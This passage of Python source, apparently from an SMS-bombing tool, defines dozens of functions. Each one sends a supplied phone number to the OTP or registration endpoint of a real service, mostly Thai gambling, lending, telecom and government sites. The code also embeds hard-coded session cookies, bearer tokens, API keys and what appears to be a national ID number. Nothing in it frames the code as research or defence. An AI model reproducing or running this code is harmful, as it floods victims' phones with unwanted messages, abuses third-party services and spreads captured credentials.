             "agent_register": "60a76a7f233d2900110070e0",
             "tel": phone
         })


def api42(phone):
    post("https://www.pruksa.com/member/member_otp/re_create",
         headers=header,
         data=f"required=otp&mobile={phone}")


def api43(phone):
    post("https://vaccine.trueid.net/vacc-verify/api/getotp",
         headers=header,
         json={
             "msisdn": phone,
             "function": "enroll"
         })


def api44(phone):
    post(
        "https://ufa108.ufabetcash.com/api/",
        headers=header,
        data=
        f"cmd=request_form_register_detail_check&web_account_id=36&auto_bank_group_id=1&m_name=sl&m_surname=ak&m_line=snsb1j&m_bank=4&m_account_number=8572178402&m_from=41&m_phone={phone}"
    )


def api45(phone):
    post("https://www.mrcash.top/h5/LoginMessage_ultimate",
         data={
             "phone": phone,
             "type": "2",
             "ctype": "1"
         })


def api46(phone):
    post("https://www.qqmoney.ltd/jackey/sms/login",
         json={
             "appId": "5fc9ff297eb51f1196350635",
             "companyId": "5fc9ff12197278da22aff029",
             "mobile": phone
         },
         headers={"Content-Type": "application/json;charset=UTF-8"})


def api47(phone):
    post("https://www.monomax.me/api/v2/signup/telno",
         json={
             "password": "12345678+",
             "telno": phone
         })


def api48(phone):
    post("https://m.pgwin168.com/api/register-otp",
         json={
             "brands_id": "60e4016f35119800184f34a5",
             "agent_register": "60e57c3b2ead950012fc5fba",
             "tel": phone
         })


def api49(phone):
    post("https://www.som777.com/api/otp/register",
         json={
             "applicant": phone,
             "serviceName": "SOM777"
         })


def api50(phone):
    post("https://www.konglor888.com/api/otp/register",
         json={
             "applicant": phone,
             "serviceName": "KONGLOR888"
         })


def api51(phone):
    get("https://api.quickcash8.com/v1/login/captcha?timestamp=1636359633&sign=3a11b88fbf58615099d15639e714afcc&token=&version=2.3.2&appsFlyerId=1636346593405-2457389151564256014&platform=android&channel_str=&phone="
        + phone + "&img_code=",
        headers={
            "Host": "api.quickcash8.com",
            "Connection": "Keep-Alive",
            "Accept": "gzip",
            "User-Agent": "okhttp/3.11.0"
        })


def api52(phone):
    get("https://users.cars24.co.th/oauth/consumer-app/otp/" + phone +
        "?lang=th",
        headers={
            "accept":
            "application/json, text/plain, */*",
            "x_vehicle_type":
            "CAR",
            "cookie":
            "_ga=GA1.3.523508414.1640152799;_gid=GA1.3.999851247.1640152799;_fbp=fb.2.1640152801502.837786780;_gac_UA-65843992-28=1.1640152807.EAIaIQobChMIi9jVo9329AIVizArCh1bFAuMEAAYASAAEgJqA_D_BwE;_dc_gtm_UA-65843992-28=1;_hjSessionUser_2738441=eyJpZCI6IjYwMjMzZjYyLTFlMzYtNWZmMy04MjZkLTMzOTAxNTMwODQ4NyIsImNyZWF0ZWQiOjE2NDAxNTI4MDEzMDYsImV4aXN0aW5nIjp0cnVlfQ==;_hjSession_2738441=eyJpZCI6ImI4MDNlNTFkLTFiYTYtNGExZi05MGIzLTk5OWRmMjhhM2RiOCIsImNyZWF0ZWQiOjE2NDAxNjY4ODgwNDF9;_hjAbsoluteSessionInProgress=0;cto_bundle=uVFzcF8lMkYxM0hsRGxQc1M4YThaRmhHJTJGRTBtSUdwNzVuRkVldzI5QlpIYktWbnZFcUlzdDZ1ZnhMT3JqVVhFQyUyQmtGUE9MTFk5akpyVnl4ekZnZlJ4UVN3WnRHdUNyJTJGWW03aVRSeWtLc2wxTjA3QmR0THNzcjNsJTJCcEJHSXlOUzNxTVc2ZmJPaGclMkZhRUhkV3I2cTI1dXUlMkZhYnl1dyUzRCUzRA"
        })


def api53(phone):
    post("https://www.kaitorasap.co.th/api/index.php/send-otp/",
         data={
             "phone_number": phone,
             "lag": " "
         })


def api54(phone):
    requests = Session()
    token = search('<meta name="_csrf" content="(.*)" />',
                   get("https://www.shopat24.com/register/").text).group(1)
    post("https://www.shopat24.com/register/ajax/requestotp/",
         data=f"phoneNumber={phone}",
         headers={
             "content-type":
             "application/x-www-form-urlencoded; charset=UTF-8",
             "x-csrf-token": token
         })


def api55(phone):
    session = Session()
    ReqTOKEN = session.get(
        "https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated",
        headers={
            "User-Agent":
            "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"
        }).text
    session.post(
        "https://srfng.ais.co.th/login/sendOneTimePW",
        data=
        f"msisdn=66{phone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",
        headers={
            "User-Agent":
            "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
            "Content-Type":
            "application/x-www-form-urlencoded; charset=UTF-8",
            "authorization":
            f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", ReqTOKEN).group(1)}'''
        })


def api56(phone):
    post("https://discord.com/api/v9/users/@me/phone",
         headers=header,
         json={"phone": "+66" + phone})


def api57(phone):
    post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp",
         data={"mobile_phone_no": phone})


def api58(phone):
    post("https://www.tgfone.com/signin/otp_chk_fast",
         headers=header,
         json=f"mobile={phone}&type_otp=7")


def api59(phone):
    post("https://ufa3bb.com/account/register/sendotp",
         headers=header,
         data=f"phone={phone}")


def api60(phone):
    post(
        "https://login.s-momclub.com/accounts.otp.sendCode",
        data=
        f"phoneNumber=%2B66{phone[1:]}&lang=th&APIKey=3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC&source=showScreenSet&sdk=js_latest&authMode=cookie&pageURL=https%3A%2F%2Fwww.s-momclub.com%2Fprofile%2Flogin&sdkBuild=12563&format=json",
        headers={
            "content-type":
            "application/x-www-form-urlencoded",
            "user-agent":
            "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
            "cookie":
            "gmid=gmid.ver4.AcbHriHAww._ill8qHpGNXtv9aY3XQyCvPohNww4j7EtjeiM3jBccqD7Vx0OmGeJuXcpQ2orXGs.nH0yRZjbm75C-5MVgB2Ii0PWvx6TICBn1LYI_XtlgoHg9mnouZgNs6CHULJEitOfkBhHvf8zUvrvMauanc52Sw.sc3;ucid=Tn63eeu2u8ygoINkqYBk5w;hasGmid=ver4;_ga=GA1.2.1714152564.1642328595;_fbp=fb.1.1642328611770.178002163;_gcl_au=1.1.64457176.1642329285;gig_bootstrap_3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC=login_ver4;_gid=GA1.2.1524201365.1642442639;_gat=1;_gat_rolloutTracker=1;_gat_globalTracker=1;_gat_UA-62402337-1=1"
        })


def api61(phone):
    post("https://globalapi.pointspot.co/papi/oauth2/signinWithPhone",
         data={"phoneNumber": f"+66{phone[1:]}"})


def api62(phone):
    get(f"https://hdmall.co.th/phone_verifications?express_sign_in=1&mobile={phone}"
        )


def api63(phone):
    post("https://asha168vip.com/_ajax_/request-otp",
         data={
             "request_otp[phoneNumber]": phone,
             "request_otp[termAndCondition]": "1",
             "request_otp[_token]": "1642443743"
         })


def api64(phone):
    post(
        "https://account.xiaomi.com/pass/sendPhoneRegTicket",
        data=f"region=US&phone=%2B66{phone[1:]}",
        headers={
            "content-type":
            "application/x-www-form-urlencoded; charset=UTF-8",
            "user-agent":
            "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
            "cookie":
            "captchaToken=mXYXs+xvEHAZdhKnXK1XlopRcisSn05D6xhZU+uL3ghvh1Yf/4rYTExH+2xl+yZv;deviceId=wb_aca09552-fd37-4204-9d7a-20045de5c5bf;uLocale=en"
        })


def api65(phone):
    post(
        "https://gamingnation.dtac.co.th/api/otp/generate",
        data={
            "template": "register",
            "phone_no": phone
        },
        headers={
            "User-Agent":
            "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"
        })


def api66(phone):
    post("https://www.aurora.co.th/signin/otp_chk",
         data=f"mobile={phone}&type_otp=3",
         headers={
             "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
         })


def api67(phone):
    get(f"https://api.joox.com/web-fcgi-bin/web_account_manager?optype=5&os_type=2&country_code=66&phone_number=66{phone[1:]}&time=1641777424446&_=1641777424449&callback=axiosJsonpCallback2"
        )


def api68(phone):
    post("http://716081.com/wap/user/sendPhoneMsg",
         json={
             "uri": "/user/sendPhoneMsg",
             "token": "",
             "paramData": {
                 "phoneVerifyType": 0,
                 "phoneNumber": f"66{phone[1:]}",
                 "siteCode": "intqa"
             }
         }).text


def api69(phone):
    post("https://login.928royal.com/api/APISendOTP.php",
         data=f"mobileNumber=0{phone}",
         headers={
             "content-type": "application/x-www-form-urlencoded; charset=UTF-8"
         })


def api70(phone):
    post(
        "https://prettygaming168-api.auto888.cloud/api/v3/otp/send",
        data={
            "tel": phone,
            "otp_type": "register"
        },
        headers={
            "user-agent":
            "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
            "authorization":
            "Basic 755b4608e637d413d668502704d93e377f4f67b2d3d0f50e5644af3607f31ddb3174ecaf5b2c40c86f9efc32de1ee0bbf3e7a2b32cb055a3cb7068e1bb152844"
        })


def api71(phone):
    post(
        "https://www.bigthailand.com/authentication-service/user/OTP",
        json={
            "locale": "th",
            "phone": f"+66{phone[1:]}",
            "email": "dkdk@gmail.com",
            "userParams": {
                "buyerName": "ekek ks",
                "activateLink": "www.google.com"
            }
        },
        headers={
            "content-type":
            "application/json",
            "user-agent":
            "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
            "authorization":
            "Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..P9LOZOUnXvgw5wDxPqSuCg.jjRU6v4iidkFNv4nROigeng1s9e96LnzplOaml7YSasaTxwozO37IWuq-h6bV5JyxpaRvIL9UCochw-3OciWq_VrORNwnH45b-ziIAhZ-CpLpt1O_4EpM27y7TYXBb_w6DT3BJp1ARkG7CqSouTnGg.2n1G9HbFJzArFH5Rr2m9kg",
            "cookie":
            "auth.strategy=local;auth._token.local=Bearer%20eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..P9LOZOUnXvgw5wDxPqSuCg.jjRU6v4iidkFNv4nROigeng1s9e96LnzplOaml7YSasaTxwozO37IWuq-h6bV5JyxpaRvIL9UCochw-3OciWq_VrORNwnH45b-ziIAhZ-CpLpt1O_4EpM27y7TYXBb_w6DT3BJp1ARkG7CqSouTnGg.2n1G9HbFJzArFH5Rr2m9kg;_utm_objs=eyJzb3VyY2UiOiJnb29nbGUiLCJtZWRpdW0iOiJjcGMiLCJjYW1wYWlnbiI6ImFkd29yZHMiLCJj%0D%0Ab250ZW50IjoiYWR3b3JkcyIsInRlcm0iOiJhZHdvcmRzIiwidHlwZSI6InJlZmVycmVyIiwidGlt%0D%0AZSI6MTY0MjMyOTM5OTU4NSwiY2hlY2tzdW0iOiJaMjl2WjJ4bExXTndZeTFoWkhkdmNtUnpMVEUy%0D%0ATkRJek1qa3pPVGsxT0RVPSJ9;_pk_ref.564990563.2c0e=%5B%22%22%2C%22%22%2C1642329400%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D;_pk_ses.564990563.2c0e=*;_gcl_au=1.1.833577636.1642329400;_asm_visitor_type=n;_ac_au_gt=1642329406505;cdp_session=1;_asm_uid=637506384;_ga=GA1.2.1026893832.1642329403;_gid=GA1.2.1437369318.1642329403;OptanonConsent=isIABGlobal=false&datestamp=Sun+Jan+16+2022+17%3A36%3A45+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.9.0&hosts=&consentId=e0fe7ec6-3c1e-4aa7-9e72-ecd2ed724416&interactionCount=0&landingPath=https%3A%2F%2Fwww.bigthailand.com%2Fcategory%2F850%2F%25E0%25B8%2599%25E0%25B9%2589%25E0%25B8%25B3%25E0%25B8%25A1%25E0%25B8%25B1%25E0%25B8%2599%25E0%25B9%2580%25E0%25B8%2584%25E0%25B8%25A3%25E0%25B8%25B7%25E0%25B9%2588%25E0%25B8%25AD%25E0%25B8%2587%25E0%25B9%2581%25E0%25B8%25A5%25E0%25B8%25B0%25E0%25B8%2582%25E0%25B8%25AD%25E0%25B8%2587%25E0%25B9%2580%25E0%25B8%25AB%25E0%25B8%25A5%25E0%25B8%25A7%2F%25E0%25B8%2599%25E0%25B9%2589%25E0%25B8%25B3%25E0%25B8%25A1%25E0%25B8%25B1%25E0%25B8%2599%25E0%25B9%2580%25E0%25B8%2584%25E0%25B8%25A3%25E0%25B8%25B7%25E0%25B9%2588%25E0%25B8%25AD%25E0%25B8%2587%3Fgclid%3DCj0KCQiAoY-PBhCNARIsABcz772kcpD38d5bhec3kfJbZgVxKFVwa2RmZytANH-PiwJdPXbqc7VOzCEaAuBkEALw_wcB&groups=C0001%3A1%2CC0003%3A1%2CC0002%3A1%2CC0007%3A1;_fbp=fb.1.1642329406623.363807498;_hjSessionUser_2738378=eyJpZCI6ImVkNmZhOGY3LTQwNDctNTNjMi04YTVjLTQ0OGE5MDA4YjhiZCIsImNyZWF0ZWQiOjE2NDIzMjk0MDQ4MDMsImV4aXN0aW5nIjpmYWxzZX0=;_hjFirstSeen=1;_hjIncludedInSessionSample=0;_hjSession_2738378=eyJpZCI6ImNhN2UwZDFhLTZkNmQtNGM0Mi04YmI1LTg4NWJmNzZjMGExZCIsImNyZWF0ZWQiOjE2NDIzMjk0MTEwNzcsImluU2FtcGxlIjpmYWxzZX0=;_hjIncludedInPageviewSample=1;_hjAbsoluteSessionInProgress=0;_gac_UA-165856282-1=1.1642329477.Cj0KCQiAoY-PBhCNARIsABcz772kcpD38d5bhec3kfJbZgVxKFVwa2RmZytANH-PiwJdPXbqc7VOzCEaAuBkEALw_wcB;_gcl_aw=GCL.1642329478.Cj0KCQiAoY-PBhCNARIsABcz772kcpD38d5bhec3kfJbZgVxKFVwa2RmZytANH-PiwJdPXbqc7VOzCEaAuBkEALw_wcB;_pk_id.564990563.2c0e=0.1642329400.1.1642329489.1642329400.;_ac_client_id=637515726.1642329496;_ac_an_session=zmzlzhzlzizqzmzjzkzjzdzlzgzkzmzizmzkzhzlzdzizlznzhzgzhzqznzqzlzdzizdzizlznzhzgzhzqznzqzlzdzizlznzhzgzhzqznzqzlzdzizdzgzjzizdzjzd2h25zdzgzdzezizd;au_id=637515726;_ga_80VN88PBVD=GS1.1.1642329399.1.1.1642329493.44"
        })


def api72(phone):
    post(
        "https://api.cashmarket-th.com/app/userinfo/send/smsCode",
        json={
            "baseParams": {
                "platformId": "android",
                "deviceType": "h5",
                "deviceIdKh":
                "20220118121149smyjjs57jxtqbwkuu74y0vd6p5yzhrmp86872f73364d46d3bf9446ddd583ef61ee8fafe504bab46ec267ca96a99281d6rreqhrlgsg4p3srgv1i5s4pp8u9la6gf1",
                "termSysVersion": "5.1.1",
                "termModel": "A37f",
                "brand": "",
                "termId": "null",
                "appType": "6",
                "appVersion": "2.0.0",
                "pValue": "",
                "position": {
                    "lon": "null",
                    "lat": "null"
                },
                "bizType": "0000",
                "appName": "Cash Market",
                "packageName": "com.cashmarketth.h5",
                "screenResolution": "720,1280"
            },
            "clientTypeFlag": "h5",
            "token": "",
            "phoneNumber": "",
            "timestamp": "1642479101529",
            "bizParams": {
                "phoneNum": phone,
                "code": "null",
                "type": 200,
                "channelCode": "hJ071"
            }
        })


def api73(phone):
    post("https://bacara888.com/api/otp/register",
         data={
             "applicant": phone,
             "serviceName": "gclub"
         })


def api74(phone):
    post("https://www.tslpv.net/api/v1/sendRegisterSms",
         data={
             "national_number": phone,
             "country_code": "TH",
             "g_token": "null"
         })


def api75(phone):
    post("https://queenclub88.com/api/register/phone", data={"phone": phone})


def api76(phone):
    post(
        "https://api.cdfoi9.com/api/v1/index.php",
        data=
        f"module=%2Fusers%2FgetVerificationCode&mobile={phone}&merchantId=111&domainId=0&accessId=&accessToken=&walletIsAdmin=",
        headers={
            "user-agent":
            "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded"
        })


def api77(phone):
    get(f"https://api.joox.com/web-fcgi-bin/web_account_manager?optype=5&os_type=2&country_code=66&phone_number=0{phone}&time=1641777424446&_=1641777424449&callback=axiosJsonpCallback2"
        )


def api79(phone):
    send = Session()
    send.headers.update({
        "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38",
        "Content-Type":
        "application/x-www-form-urlencoded",
        "Accept":
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
    })
    snd = send.post(
        "https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
        data=f"st.r.phone=+66{phone[1:]}")
    sed = send.post(
        "https://ok.ru/dk?cmd=AnonymRegistrationAcceptCallUI&st.cmd=anonymRegistrationAcceptCallUI",
        data="st.r.fieldAcceptCallUIButton=Call")


def api80(phone):
    get(f"https://findclone.ru/register?phone=+66{phone[1:]}",
        headers={
            "X-Requested-With":
            "XMLHttpRequest",
            "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"
        }).json()


def api88(phone):
    post("https://globalapi.pointspot.co/papi/oauth2/signinWithPhone",
         data={"phoneNumber": phone})


def api89(phone):  # QCLOUD
    post(
        "https://api.cashmarket-th.com/app/userinfo/send/smsCode",
        json={
            "baseParams": {
                "platformId": "android",
                "deviceType": "h5",
                "deviceIdKh":
                "20220118121149smyjjs57jxtqbwkuu74y0vd6p5yzhrmp86872f73364d46d3bf9446ddd583ef61ee8fafe504bab46ec267ca96a99281d6rreqhrlgsg4p3srgv1i5s4pp8u9la6gf1",
                "termSysVersion": "5.1.1",
                "termModel": "A37f",
                "brand": "",
                "termId": "null",
                "appType": "6",
                "appVersion": "2.0.0",
                "pValue": "",
                "position": {
                    "lon": "null",
                    "lat": "null"
                },
                "bizType": "0000",
                "appName": "Cash Market",
                "packageName": "com.cashmarketth.h5",
                "screenResolution": "720,1280"
            },
            "clientTypeFlag": "h5",
            "token": "",
            "phoneNumber": "",
            "timestamp": "1642479101529",
            "bizParams": {
                "phoneNum": phone,
                "code": "null",
                "type": 200,
                "channelCode": "hJ071"
            }
        })


def api90(phone):
    post("https://shopgenix.com/api/sms/otp/",
         headers=header,
         data=f"mobile_country_id=1&mobile={phone}")


# SME-GP
def api91(phone):
    post("https://api.thaisme.one/smegp/register/request-otp",
         json={"MOBILE": phone})


#YOUROTP
def api92(phone):
    post(
        "https://apiv3.slot999ss.com/front/api/register/set/OTP",
        data=f"phone={phone}",
        headers={
            "content-type":
            "application/x-www-form-urlencoded;charset=UTF-8",
            "user-agent":
            "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"
        })


#Sabuy-Ebuy
def api93(phone):
    post("https://sabuyebuy.com/wp-json/api/v1/get-otp",
         headers=header,
         json={"msisdn": f"{phone}"})


#FAST-PLUS.
def api94(phone):
    post(
        "https://prettygaming168-api.auto888.cloud/api/v3/otp/send",
        data={
            "tel": phone,
            "otp_type": "register"
        },
        headers={
            "user-agent":
            "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
            "authorization":
            "Basic 755b4608e637d413d668502704d93e377f4f67b2d3d0f50e5644af3607f31ddb3174ecaf5b2c40c86f9efc32de1ee0bbf3e7a2b32cb055a3cb7068e1bb152844"
        })


#Zilingo
def api95(phone):
    post(
        "https://id.zilingo.com/api/v1/userVerification/initiate?up_s=B2B_ASIA_MALL&up_cd=v1_eyJjbGllbnRVc2VySWRlbnRpZmljYXRpb24iOnsiYW5vbnltb3VzVXNlcklkT3B0IjoiQUlENTUwMDY3MTIzMjA0NTY2MDkyIiwic2Vzc2lvbklkT3B0IjoiU0lENTUwMDY3MTIzMjA0NTY2MDkyIiwidXNlcklkT3B0IjpudWxsfSwic2NyZWVuT3B0Ijp7InNjcmVlblR5cGUiOiJDQVRFR09SWSIsInNjcmVlbklkIjoiV0NMIiwic2NvcGUiOm51bGx9LCJidXllclJlZ2lvbk9wdCI6IkIyQl9USEEiLCJsb2NhbGVDb2RlIjoidGgiLCJxdiI6eyJjbGllbnQiOiJXZWIiLCJzdWJDbGllbnQiOiJEZXNrdG9wV2ViIiwidmVyc2lvbiI6IjM1LjguNSJ9fQ==",
        headers=header,
        json={
            "channelDetails": {
                "phoneNumber": f"+66{phone[1:]}",
                "channelType": "SMS"
            },
            "source": "UNIFIED_LOGIN",
            "action": "OTP_LOGIN",
            "redirectTo": "/th-th/Women/Clothing"
        })


#DGA
def api96(phone):
    post("https://accounts.egov.go.th/Citizen/Account/MobileRegisterJson",
         headers=header,
         json={
             "Mobile": f"{phone}",
             "TransactionId": "f28ef0a2-23ff-4abd-b9e6-fdfc271298ea"
         })


def api97(phone):
    post("https://tdhw.treasury.go.th/TD-Vote/api/otp/request",
         json={
             "ID_CARD": "1104200197909",
             "TEL": f"{phone}",
             "OTP_TYPE": "OTP_TEST"
         })


def api98(phone):
    post(
        "https://user-api.learn.co.th/authentication/sendOTP",
        json={"mobileNumber": phone},
        headers={
            "user-agent":
            "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
            "Host": "user-api.learn.co.th",
            "content-length": "29",
            "sec-ch-ua-mobile": "?1",
            "content-type": "application/json;charset=UTF-8",
            "accept": "application/json, text/plain, /",
            "sec-ch-ua-platform": "Android",
            "origin": "https://user.learn.co.th",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://user.learn.co.th/",
            "x-api-key": "USER_API_KEY"
        })


#FOODDIARY
def api99(phone):
    post(
        "https://www.fooddiaryonlineshop.com/RegisterNewCustomer",
        headers=header,
        data=
        f"__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=Ble7%2FRYu%2F1RjtS%2FfO9KgKdBWKCntkuS%2F0x7Qh6w4mnY7kV82h741dj1JFc5xnFbW7yacbboe0%2B5nTVVF%2BFSGEHQvaTkL4HQ5qDJbZMBQEt73YZZ%2FZON2LWw193tcYCjDwL3y3vy3lks%2BduyUOCNMwlwNpfrPDsvbhgT4qDCekWgvnnFrzFGCtQYO6cTU3Lax6YpvUbBld0oKgkWcHg0efFp3K2S2fLx%2BK4oTVGr6bq1QdKl5uPHqtL04IHkdy7X6Wbf6lUTQgOa5q5wLfE2KUGHWUUsYjahMwHmRCaVSxB7P1eDmiZ%2BQNku9pHs7m50GtCSePXPSfYtFBumDCM2R1XklFOdYV4X1jJgt%2Fe3MGV1Xmj7cRE%2FsBk1u%2FMYfN%2BmXb5dxruqgDuhXAnWP%2F8Syot1XGEUtVclmfF5NIB0KkCu6He8dheN%2BhEkupLqzP6Ip6OAMNnvssm1rMngwDy7ipCNC3dPXMj83IpBuuD1LWbPr3x3ksf0%2FrGL4yM7jvr8a99ifPcJPcmJzY%2Feay0PKwdwA3u2KTyCoXVgMZwqvsdRoyRHlFooZ3AHoBNsQrkegtyk5eHtjpBTLHD1dzQT3R%2FRaYIbencMw%2B5BbVJWiPzVTXF%2BiQ9A64UcUP9adMciJa7TudfL331vSRd%2FwVMkA%2B1fDtVrfBBi8%2BHbta7BsuVjk0ZodiLMuloOsYaTSilSLmidUpEZFsj0Zhz%2FpwGu%2FGKMixcG95PmRkOdpAj4d2D8%3D&__VIEWSTATEGENERATOR=94756D41&ctl00%24MainContent%24PageGUIDForSession=&ctl00%24MainContent%24rdEmail=U&ctl00%24MainContent%24rdMobile=C&ctl00%24MainContent%24cbpEmptry%24txtMobileNo%24State=%7B%26quot%3BrawValue%26quot%3B%3A%26quot%3B{phone}%26quot%3B%2C%26quot%3BvalidationState%26quot%3B%3A%26quot%3B%26quot%3B%7D&ctl00%24MainContent%24cbpEmptry%24txtMobileNo=0958816629&ctl00%24MainContent%24cbpEmptry%24txtOTP%24State=%7B%26quot%3BrawValue%26quot%3B%3A%26quot%3B%26quot%3B%2C%26quot%3BvalidationState%26quot%3B%3A%26quot%3B%26quot%3B%7D&ctl00%24MainContent%24cbpEmptry%24txtOTP=&ctl00%24MainContent%24cbpEmptry%24chkRead=U&ctl00%24MainContent%24cbpEmptry%24chkConsent=U&DXScript=1_16%2C1_17%2C1_28%2C1_66%2C1_18%2C1_19%2C1_20%2C1_21%2C1_224%2C1_225%2C1_230%2C1_229%2C1_51%2C1_22%2C1_14%2C1_226%2C1_52&DXCss=1_248%2C1_69%2C1_71%2C1_250%2C1_247%2C1_75%2C1_74%2C1_251%2C%2FContent%2Fcss%3Fv%3DFILIkBdKK0FrNSvnRmezf5qTxic9NR7FOzzIJ8iQAKQ1%2Cfavicon.ico%2C..%2F..%2FContent%2Fbootstrap.min.css%2CStyles%2Fbutton.css&__CALLBACKID=ctl00%24MainContent%24cbpEmptry&__CALLBACKPARAM=c0%3ARequestOTP&__EVENTVALIDATION=N%2FlR5TtQKjdRNUQy0QFSjIjFW06D%2Fdy2VFm5Zl%2FTN%2FlsEYUsQVZwH8qpQ5sFzI0PBX2ZLH3HhxXkkZRvuada%2Bu6zsHxSgV3In38ahlf75%2Blm%2BguMSbwp%2FSxuo4Cc3cm5ZFVYYR9eVfvdwG4YsxWYbA%3D%3D"
    )


#yandex
def api100(phone):
    post(
        "https://passport.yandex.com/registration-validations/phone-confirm-code-submit",
        headers=header,
        data=
        f"track_id=b3dc4a29a19d038f1cd522187726d7bb5a&csrf_token=e150046ff026a517c15d45444294ffa3275b140c%3A1645857142788&number={phone}&isCodeWithFormat=true&confirm_method=by_sms"
    )


def api101(phone):
    session = Session()
    ReqTOKEN = session.get(
        "https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated",
        headers={
            "User-Agent": useragent
        }).text
    res = session.post(
        "https://srfng.ais.co.th/api/v2/login/sendOneTimePW",
        data=
        f"msisdn=66{phone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",
        headers={
            "User-Agent":
            useragent,
            "Content-Type":
            "application/x-www-form-urlencoded; charset=UTF-8",
            "authorization":
            f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", ReqTOKEN).group(1)}'''
        })


def api102(phone):
    post(
        "https://api.zaapi.co/api/store/auth/otp/login",
        json={
            "phoneNumber": f"+66{phone[1:]}",
            "namespace": "zaapi-buyers"
        },
        headers={
            "user-agent":
            "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"
        })


def api103(phone):
    get(f"https://bkk-api.ks-it.co/Vcode/register?country_code=66&phone={phone}&sms_type=1&user_type=2&app_version=4.3.25&device_id=79722530562d973f&app_device_param=%7B%22os%22%3A%22Android%22%2C%22app_version%22%3A%224.3.25%22%2C%22model%22%3A%22A37f%22%2C%22os_ver%22%3A%225.1.1%22%2C%22ble%22%3A%220%22%7D&language=th&token="
        )


#OTP_SMS
def api104(phone):
    post(
        "https://www.vegas77slots.com/auth/send_otp",
        data=
        f"phone={phone}&otp=&password=&bank=&bank_number=&full_name=&ref=21076",
        headers={
            "content-type": "application/x-www-form-urlencoded",
            "user-agent":
            "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
            "cookie": "vegas77slots=pj5kj4ovnk2fao1sbaid2eb76l1iak7b"
        })


#privacy
def api105(phone):
    post(
        "https://ipro356.com/wp-content/themes/hello-elementor/modules/index.php",
        data=f"method=wpRegisterotp&otp_tel={phone}",
        headers={
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "user-agent":
            "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
            "cookie": "PHPSESSID=vtacuje1no166kkp4d40nolak5"
        })


#kaspy
def api106(phone):
    post(
        "https://kaspy.com/sms/sms.php/",
        data=f"phone={phone}",
        headers={
            "Content-Type":
            "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent":
